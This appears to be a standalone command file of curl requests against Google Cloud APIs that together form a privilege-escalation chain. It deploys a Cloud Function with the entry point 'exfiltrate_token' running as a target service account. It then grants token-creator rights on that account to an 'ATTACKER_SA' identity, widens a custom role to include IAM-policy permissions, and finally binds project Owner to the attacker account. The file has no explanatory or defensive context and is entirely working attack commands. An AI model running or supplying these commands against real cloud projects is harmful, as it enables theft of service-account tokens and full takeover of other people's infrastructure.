curl.command:
CREATE_RESPONSE=$(curl -sS -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://cloudfunctions.googleapis.com/v2/projects/PROJECT_ID/locations/REGION/functions?functionId=FUNCTION_NAME" \
  -d "{
    \"buildConfig\": {
      \"runtime\": \"python312\",
      \"entryPoint\": \"exfiltrate_token\",
      \"source\": {\"storageSource\": {\"bucket\": \"$UPLOAD_BUCKET\", \"object\": \"$UPLOAD_OBJECT\"}},
      \"serviceAccount\": \"projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com\"
    },
    \"serviceConfig\": {
      \"serviceAccountEmail\": \"TARGET_SA@PROJECT_ID.iam.gserviceaccount.com\",
      \"ingressSettings\": \"ALLOW_ALL\",
      \"maxInstanceCount\": 1,
      \"availableMemory\": \"128Mi\",
      \"timeoutSeconds\": 60
    }
  }")
OPERATION_NAME=$(echo "$CREATE_RESPONSE" | jq -r '.name')

UPDATE_RESPONSE=$(curl -sS -X PATCH \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  "https://cloudfunctions.googleapis.com/v2/projects/PROJECT_ID/locations/REGION/functions/FUNCTION_NAME?updateMask=buildConfig.source,buildConfig.entryPoint" \
  -d "{
    \"buildConfig\": {
      \"entryPoint\": \"exfiltrate_token\",
      \"source\": {\"storageSource\": {\"bucket\": \"$UPLOAD_BUCKET\", \"object\": \"$UPLOAD_OBJECT\"}}
    }
  }")
OPERATION_NAME=$(echo "$UPDATE_RESPONSE" | jq -r '.name')

curl -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "policy": {
      "bindings": [{
        "role": "roles/iam.serviceAccountTokenCreator",
        "members": ["serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com"]
      }]
    }
  }' \
  "https://iam.googleapis.com/v1/projects/PROJECT_ID/serviceAccounts/TARGET_SA@PROJECT_ID.iam.gserviceaccount.com:setIamPolicy"

curl -sS -X PATCH \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "includedPermissions": [
      "iam.roles.update",
      "resourcemanager.projects.setIamPolicy"
    ]
  }' \
  "https://iam.googleapis.com/v1/projects/PROJECT_ID/roles/CUSTOM_ROLE_ID?updateMask=includedPermissions"

curl -sS -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "policy": {
      "bindings": [
        EXISTING_BINDINGS,
        {
          "role": "roles/owner",
          "members": ["serviceAccount:ATTACKER_SA@PROJECT_ID.iam.gserviceaccount.com"]
        }
      ]
    }
  }' \
  "https://cloudresourcemanager.googleapis.com/v1/projects/PROJECT_ID:setIamPolicy"
